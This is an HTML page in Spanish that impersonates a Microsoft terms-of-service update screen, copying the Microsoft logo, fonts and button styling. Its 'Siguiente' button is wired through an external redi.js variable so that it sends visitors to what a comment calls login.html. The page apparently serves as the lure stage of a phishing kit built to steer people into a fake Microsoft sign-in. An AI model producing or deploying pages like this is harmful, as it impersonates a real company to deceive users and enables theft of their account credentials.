<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualización de Términos - Microsoft</title>
    <style>
        /* Reset básico */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        /* Fondo oscuro con la imagen que me indicaste */
        body {
            background: linear-gradient(rgba(0, 0, 0, 0.55), rgba(0, 0, 0, 0.55)),
                url("./assets/web_dark.svg") no-repeat center center;
            background-size: cover;
            background-attachment: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            min-height: 100dvh;
            padding: 20px;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
        }

        /* La tarjeta blanca (formulario) */
        .container {
            background-color: #ffffff;
            max-width: 440px;
            width: 100%;
            text-align: center;
            padding: 40px;

            /* Contorno y sombra para que resalte sobre el fondo oscuro */
            border: 1px solid #c8c6c4;
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        /* Logotipo de Microsoft */
        .logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
        }

        /* Título principal */
        .title {
            font-size: 26px;
            font-weight: 600;
            line-height: 1.3;
            margin-bottom: 30px;
            color: #1a1a1a;
        }

        /* Contenedor de la imagen 3D */
        .image-container {
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }

        .main-graphic {
            width: 140px;
            height: 140px;
            object-fit: contain;
        }

        /* Texto descriptivo */
        .description {
            font-size: 15px;
            line-height: 1.5;
            color: #555555;
            margin-bottom: 35px;
        }

        /* Botón azul (Siguiente) */
        .btn-primary {
            display: block;
            width: 100%;
            padding: 14px 20px;
            background-color: #0067b8;
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 600;
            border-radius: 4px;
            transition: background-color 0.2s ease;
            margin-bottom: 25px;
        }

        .btn-primary:hover {
            background-color: #005da6;
        }

        /* Enlace inferior */
        .link-secondary {
            display: inline-block;
            color: #0067b8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: color 0.2s ease;
        }

        .link-secondary:hover {
            text-decoration: underline;
            color: #004578;
        }
    </style>
</head>

<body>

    <div class="container">
        <!-- Logotipo de Microsoft -->
        <div class="logo">
            <svg width="108" height="23" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="10" height="10" fill="#F25022" />
                <rect x="11" y="0" width="10" height="10" fill="#7FBA00" />
                <rect x="0" y="11" width="10" height="10" fill="#00A4EF" />
                <rect x="11" y="11" width="10" height="10" fill="#FFB900" />
                <text x="28" y="16" font-family="'Segoe UI', sans-serif" font-size="16" font-weight="600"
                    fill="#1a1a1a">Microsoft</text>
            </svg>
        </div>

        <!-- Título -->
        <h1 class="title">Estamos actualizando nuestros términos</h1>

        <!-- Imagen representativa -->
        <div class="image-container">
            <!-- Puedes reemplazar este SVG por tu imagen real si lo deseas -->
            <img class="main-graphic" src="./assets/img.png">
        </div>

        <!-- Texto de información -->
        <p class="description">
            Como parte de nuestros esfuerzos por mejorar su experiencia con Microsoft, queremos informarle de que se
            actualizó el Contrato de servicios de Microsoft.
        </p>

        <!-- Botón que redirige a login.html -->
        <a class="btn-primary">Siguiente</a>
        <script src="redi.js"></script>
        <script>

            // 2. Seleccionas el elemento (usando la clase o un ID)
            const boton = document.querySelector('.btn-primary');

            // 3. Cambias el href
            boton.href = redi;
        </script>

        <!-- Enlace inferior -->
        <a href="#" class="link-secondary">Más información sobre estas actualizaciones</a>
    </div>

</body>

</html>
